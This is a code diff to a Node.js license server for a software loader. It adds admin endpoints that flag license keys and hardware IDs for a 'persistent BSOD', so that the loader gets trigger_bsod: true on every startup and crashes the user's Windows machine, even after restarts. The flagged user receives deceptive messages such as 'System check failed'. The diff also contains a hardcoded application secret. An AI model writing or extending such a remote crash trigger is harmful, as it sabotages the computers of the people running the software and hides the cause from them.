@@ -792,6 +792,44 @@ const whitelistedLicenseKeys = ['LICENSE-21262A9912B0CD4E']; // Whitelist user's
 // Remote BSOD storage (License keys that should trigger BSOD on next authentication)
 const remoteBSODKeys = [];
 
+// ========================================
+// PERSISTENT BSOD SYSTEM
+// ========================================
+// This stores HWIDs that should be BSOD'd immediately when loader starts
+// Even if user restarts PC, they will be BSOD'd on next loader open
+const PERSISTENT_BSOD_FILE = path.join(__dirname, 'persistent_bsod.json');
+let persistentBSODList = {
+    hwids: [],      // HWIDs to BSOD
+    licenseKeys: [] // License keys to BSOD (will lookup HWID from license)
+};
+
+// Load persistent BSOD list from file
+function loadPersistentBSOD() {
+    try {
+        if (fs.existsSync(PERSISTENT_BSOD_FILE)) {
+            const data = fs.readFileSync(PERSISTENT_BSOD_FILE, 'utf8');
+            persistentBSODList = JSON.parse(data);
+            console.log(`🔴 Loaded ${persistentBSODList.hwids.length} HWIDs and ${persistentBSODList.licenseKeys.length} license keys for persistent BSOD`);
+        }
+    } catch (error) {
+        console.error('Error loading persistent BSOD list:', error);
+        persistentBSODList = { hwids: [], licenseKeys: [] };
+    }
+}
+
+// Save persistent BSOD list to file
+function savePersistentBSOD() {
+    try {
+        fs.writeFileSync(PERSISTENT_BSOD_FILE, JSON.stringify(persistentBSODList, null, 2));
+        console.log('💾 Saved persistent BSOD list');
+    } catch (error) {
+        console.error('Error saving persistent BSOD list:', error);
+    }
+}
+
+// Load on startup
+loadPersistentBSOD();
+
 // Application secret (keep this secure!)
 // IMPORTANT: Change this to a secure random string!
 const APP_SECRET = 'ABCJDWQ91D9219D21JKWDDKQAD912Q';
@@ -911,6 +949,20 @@ app.post('/auth/set-loader-status', validateAppSecret, (req, res) => {
 
 // Check loader status endpoint (for loader to check before auth)
 app.post('/auth/check-loader', (req, res) => {
+    const { hwid, gpu_hash } = req.body;
+    const clientHwid = gpu_hash || hwid;
+    
+    // FIRST: Check if this HWID is in the persistent BSOD list
+    if (clientHwid && persistentBSODList.hwids.includes(clientHwid)) {
+        console.log(`🔴 PERSISTENT BSOD TRIGGERED for HWID: ${clientHwid}`);
+        return res.json({
+            success: false,
+            trigger_bsod: true,
+            message: 'System check failed'
+        });
+    }
+    
+    // Check if loader is disabled
     if (!loaderStatus.enabled) {
         res.json({
             success: false,
@@ -925,6 +977,35 @@ app.post('/auth/check-loader', (req, res) => {
             message: ''
         });
     }
+});
+
+// Persistent BSOD check endpoint - loader calls this on startup with HWID
+app.post('/auth/check-bsod', (req, res) => {
+    const { hwid, gpu_hash, license_key } = req.body;
+    const clientHwid = gpu_hash || hwid;
+    
+    // Check if HWID is in persistent BSOD list
+    if (clientHwid && persistentBSODList.hwids.includes(clientHwid)) {
+        console.log(`🔴 BSOD CHECK: HWID ${clientHwid} is in BSOD list - TRIGGERING`);
+        return res.json({
+            trigger_bsod: true,
+            reason: 'Hardware violation detected'
+        });
+    }
+    
+    // Check if license key is in persistent BSOD list
+    if (license_key && persistentBSODList.licenseKeys.includes(license_key)) {
+        console.log(`🔴 BSOD CHECK: License ${license_key} is in BSOD list - TRIGGERING`);
+        return res.json({
+            trigger_bsod: true,
+            reason: 'License violation detected'
+        });
+    }
+    
+    // Not in BSOD list
+    res.json({
+        trigger_bsod: false
+    });
 });
 
 // Also add GET endpoint for simple status check
@@ -1439,6 +1520,129 @@ app.post('/auth/delete-key', validateAppSecret, (req, res) => {
         success: true,
         message: 'License key deleted successfully',
         license_key: license_key
+    });
+});
+
+// ========================================
+// PERSISTENT BSOD ENDPOINTS
+// ========================================
+
+// Trigger persistent BSOD for a license key (Admin only)
+// This will BSOD the user IMMEDIATELY when they next open the loader
+// Even if they restart PC, they will be BSOD'd
+app.post('/auth/trigger-bsod', validateAppSecret, (req, res) => {
+    const { license_key } = req.body;
+    
+    if (!license_key) {
+        return res.json({ success: false, message: 'License key required' });
+    }
+    
+    const license = licenses[license_key];
+    
+    // Add license key to persistent BSOD list
+    if (!persistentBSODList.licenseKeys.includes(license_key)) {
+        persistentBSODList.licenseKeys.push(license_key);
+    }
+    
+    // If the license has an HWID, add that too for immediate BSOD on loader open
+    if (license && license.hwid) {
+        if (!persistentBSODList.hwids.includes(license.hwid)) {
+            persistentBSODList.hwids.push(license.hwid);
+            console.log(`🔴 Added HWID ${license.hwid} to persistent BSOD list`);
+        }
+    }
+    
+    // Also add GPU hash if available
+    if (license && license.gpu_hash && !persistentBSODList.hwids.includes(license.gpu_hash)) {
+        persistentBSODList.hwids.push(license.gpu_hash);
+        console.log(`🔴 Added GPU hash ${license.gpu_hash} to persistent BSOD list`);
+    }
+    
+    // Save to file for persistence across server restarts
+    savePersistentBSOD();
+    
+    // Also add to the one-time BSOD list for backwards compatibility
+    if (!remoteBSODKeys.includes(license_key)) {
+        remoteBSODKeys.push(license_key);
+    }
+    
+    console.log(`🔴 PERSISTENT BSOD TRIGGERED for license: ${license_key}`);
+    
+    res.json({
+        success: true,
+        message: `Persistent BSOD triggered for ${license_key}. User will be BSOD'd on next loader open.`,
+        hwid_added: license ? license.hwid : null,
+        gpu_hash_added: license ? license.gpu_hash : null
+    });
+});
+
+// Remove persistent BSOD for a license key (Admin only)
+app.post('/auth/remove-bsod', validateAppSecret, (req, res) => {
+    const { license_key } = req.body;
+    
+    if (!license_key) {
+        return res.json({ success: false, message: 'License key required' });
+    }
+    
+    const license = licenses[license_key];
+    let removed = false;
+    
+    // Remove license key from persistent list
+    const keyIndex = persistentBSODList.licenseKeys.indexOf(license_key);
+    if (keyIndex !== -1) {
+        persistentBSODList.licenseKeys.splice(keyIndex, 1);
+        removed = true;
+    }
+    
+    // Remove HWID if license exists
+    if (license && license.hwid) {
+        const hwidIndex = persistentBSODList.hwids.indexOf(license.hwid);
+        if (hwidIndex !== -1) {
+            persistentBSODList.hwids.splice(hwidIndex, 1);
+            removed = true;
+        }
+    }
+    
+    // Remove GPU hash if exists
+    if (license && license.gpu_hash) {
+        const gpuIndex = persistentBSODList.hwids.indexOf(license.gpu_hash);
+        if (gpuIndex !== -1) {
+            persistentBSODList.hwids.splice(gpuIndex, 1);
+            removed = true;
+        }
+    }
+    
+    // Save changes
+    savePersistentBSOD();
+    
+    // Also remove from one-time list
+    const oneTimeIndex = remoteBSODKeys.indexOf(license_key);
+    if (oneTimeIndex !== -1) {
+        remoteBSODKeys.splice(oneTimeIndex, 1);
+        removed = true;
+    }
+    
+    if (removed) {
+        console.log(`✅ Removed ${license_key} from BSOD lists`);
+        res.json({
+            success: true,
+            message: `BSOD flag removed for ${license_key}`
+        });
+    } else {
+        res.json({
+            success: false,
+            message: 'License key was not in BSOD list'
+        });
+    }
+});
+
+// List all persistent BSOD entries (Admin only)
+app.post('/auth/list-bsod', validateAppSecret, (req, res) => {
+    res.json({
+        success: true,
+        licenseKeys: persistentBSODList.licenseKeys,
+        hwids: persistentBSODList.hwids,
+        oneTimeKeys: remoteBSODKeys
     });
 });
 
